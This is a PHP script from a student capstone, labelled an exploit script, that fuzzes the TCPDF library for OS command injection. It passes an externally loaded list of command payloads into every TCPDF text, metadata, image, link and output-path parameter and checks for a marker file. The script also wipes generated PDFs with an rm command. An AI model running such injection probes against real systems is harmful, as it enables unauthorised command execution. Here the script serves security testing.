<!-- File: os.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (OS Command Injection) for TCPDF -->
<?php
require_once __DIR__ . '/vendor/autoload.php';
require './php_payloads.php';

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*.pdf");

function createPDF() {
    $pdf = new TCPDF();
    $pdf->setFont('times', '', 14, '', true);
    // $pdf->setCompression(false);
    $pdf->AddPage();
    return $pdf;
}


function check_test_file(string $endpoint, string $command) {
    if (file_exists('/var/www/myapp/test')) {
        echo "Endpoint: ".$endpoint."\nCommand: ".$command."\n\n\n";
    }
}


// Creator
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetCreator($command);
    $pdf->Output('/var/www/myapp/pdfs/creator'.$i.'.pdf', 'F');
    check_test_file("SetCreator", $command);
    $i++;
}

// Author
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetAuthor($command);
    $pdf->Output('/var/www/myapp/pdfs/author'.$i.'.pdf', 'F');
    check_test_file("SetAuthor", $command);
    $i++;
}

// Title
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetTitle($command);
    $pdf->Output('/var/www/myapp/pdfs/title'.$i.'.pdf', 'F');
    check_test_file("SetTitle", $command);
    $i++;
}

// Subject
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetSubject($command);
    $pdf->Output('/var/www/myapp/pdfs/subject'.$i.'.pdf', 'F');
    check_test_file("SetSubject", $command);
    $i++;
}

// Keywords
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetKeywords($command);
    $pdf->Output('/var/www/myapp/pdfs/keywords'.$i.'.pdf', 'F');
    check_test_file("SetKeywords", $command);
    $i++;
}

// Direct Image Stream
$imgdata = base64_decode('iVBORw0KGgoAAAANSUhEUgAAABwAAAASCAMAAAB/2U7WAAAABlBMVEUAAAD///+l2Z/dAAAASUlEQVR4XqWQUQoAIAxC2/0vXZDrEX4IJTRkb7lobNUStXsB0jIXIAMSsQnWlsV+wULF4Avk9fLq2r8a5HSE35Q3eO2XP1A1wQkZSgETvDtKdQAAAABJRU5ErkJggg==');
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Image('@'.$imgdata.$command, 15, 140, 50, 50, '', '', '', true, 150, '', false, false, 1, false, false, false);
    $pdf->Output('/var/www/myapp/pdfs/directimage'.$i.'.pdf', 'F');
    check_test_file("DirectImage", $command);
    $i++;
}

// Image Links
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Image("/var/www/myapp/images/xref.jpg", 15, 140, 50, 50, "JPEG", $command, '', true, 150, '', false, false, 1, false, false, false);
    $pdf->Output('/var/www/myapp/pdfs/linkimage'.$i.'.pdf', 'F');
    check_test_file("ImageLink", $command);
    $i++;
}

// Write
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Write(0, $command, $command, 0, 'C', true, 0, false, false, 0);
    $pdf->Output('/var/www/myapp/pdfs/write'.$i.'.pdf', 'F');
    check_test_file("Write", $command);
    $i++;
}

// WriteHTML
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->writeHTML($command, true, false, true, false, '');
    $pdf->Output('/var/www/myapp/pdfs/writehtml'.$i.'.pdf', 'F');
    check_test_file("writeHTML", $command);
    $i++;
}

// WriteHTMLCell
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->writeHTMLCell(0, 0, '', '', $command, 0, 1, 0, true, '', true);
    $pdf->Output('/var/www/myapp/pdfs/writehtmlcell'.$i.'.pdf', 'F');
    check_test_file("writeHTMLCell", $command);
    $i++;
}

// Language Array: meta_charset
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();

    $lg = Array();
    $lg['a_meta_charset'] = $command; 
    $lg['a_meta_dir'] = 'ltr';
    $lg['a_meta_language'] = 'en';
    $lg['w_page'] = 'page';
    $pdf->setLanguageArray($lg);

    $pdf->Output('/var/www/myapp/pdfs/metachar'.$i.'.pdf', 'F');
    check_test_file("MetaChar", $command);
    $i++;
}

// Language Array: meta_dir
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();

    $lg = Array();
    $lg['a_meta_charset'] = 'ISO-8859-1'; 
    $lg['a_meta_dir'] = $command;
    $lg['a_meta_language'] = 'en';
    $lg['w_page'] = 'page';
    $pdf->setLanguageArray($lg);

    $pdf->Output('/var/www/myapp/pdfs/metadir'.$i.'.pdf', 'F');
    check_test_file("MetaDir", $command);
    $i++;
}

// Language Array: meta_lan
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();

    $lg = Array();
    $lg['a_meta_charset'] = 'ISO-8859-1'; 
    $lg['a_meta_dir'] = 'ltr';
    $lg['a_meta_language'] = $command;
    $lg['w_page'] = 'page';
    $pdf->setLanguageArray($lg);

    $pdf->Output('/var/www/myapp/pdfs/metalan'.$i.'.pdf', 'F');
    check_test_file("Metalan", $command);
    $i++;
}

// Language Array: meta_page
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();

    $lg = Array();
    $lg['a_meta_charset'] = 'ISO-8859-1'; 
    $lg['a_meta_dir'] = 'ltr';
    $lg['a_meta_language'] = 'en';
    $lg['w_page'] = $command;
    $pdf->setLanguageArray($lg);

    $pdf->Output('/var/www/myapp/pdfs/metapage'.$i.'.pdf', 'F');
    check_test_file("Metapage", $command);
    $i++;
}

// Text
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Text(20, 20, $command);
    $pdf->Output('/var/www/myapp/pdfs/text'.$i.'.pdf', 'F');
    check_test_file("Text", $command);
    $i++;
}

// Cell
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Cell(0, 0, $command, 1, 1, 'C', 0, $command, 0);
    $pdf->Output('/var/www/myapp/pdfs/cell'.$i.'.pdf', 'F');
    check_test_file("Cell", $command);
    $i++;
}

// MultiCell
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->MultiCell(20, 10, $command, 1, 'J', false, 1, '' ,'', true);
    $pdf->Output('/var/www/myapp/pdfs/multicell'.$i.'.pdf', 'F');
    check_test_file("MultiCell", $command);
    $i++;
}

// Annotation
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Annotation(40, 40, 10, 10, $command, array('Subtype'=>'Text', 'Name' => 'Comment', 'T' => $command, 'Subj' => $command, 'C' => array(255, 255, 0)));
    $pdf->Output('/var/www/myapp/pdfs/annotation'.$i.'.pdf', 'F');
    check_test_file("Annotation", $command);
    $i++;
}

// Link
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Link(10, 10, 30, 30, $command);
    $pdf->Output('/var/www/myapp/pdfs/link'.$i.'.pdf', 'F');
    check_test_file("Link", $command);
    $i++;
}

// Output
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/output'.$command, 'F');
    check_test_file("Output", $command);
    $i++;
}

?>
<h1 style="text-align:center;">Operating System Command Injection Complete!</h1>